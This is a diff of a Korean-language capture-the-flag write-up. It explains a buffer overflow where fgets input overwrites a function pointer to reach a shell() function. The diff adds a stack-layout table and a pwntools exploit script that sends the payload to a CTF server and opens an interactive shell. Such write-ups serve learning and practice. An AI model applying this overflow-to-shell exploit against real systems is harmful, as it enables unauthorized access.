@@ -36,15 +36,39 @@ int sup()
 ```c
 int shell()
 {
-  return system("/bin/dash");
+  return system("/bin/dash"); // 쉘을 띄울 수 있다!
 }
 ```
-// 그냥 함수 실행했을 때 이미지 출력  
-fgets로 133바이트를 입력 받을 때 v5에 shell의 주소로 덮으면 v5()를 실행하면 shell 함수가 실행된다.
+정리해보자.
+
+| ebp |          |
+|:---:|:--------:|
+| ... |          |
+|  v5 | esp+0x8C |
+| ... |          |
+|  s  |  esp+0xC |
+| ... |          |
+| esp |   esp+0  |
+
+
+shell 함수를 실행하면 쉘을 띄울 수 있다. fgets로 133바이트를 입력 받을 때 v5를 shell의 주소로 덮으면 v5()를 실행했을 때 shell 함수가 실행된다.
+
+![0201](https://drive.google.com/uc?id=1jGne8Jn_lJQK0Vm3wUtljgddfTBMbMoi)
+
 
 ### exploit.py
 ***
 ```python
+#!/usr/bin/python
+from pwn import *
 
+p = remote('ctf.j0n9hyun.xyz', 3001)
+
+payload = "A"*(0x8C-0xC) + p32(0x0804849B)
+
+p.sendline(payload)
+
+p.interactive()
 ```
-문제 해결
+
+![0202](https://drive.google.com/uc?id=1GApVrN8IkoCUKXN559Ldluu8rjXOXgtH)
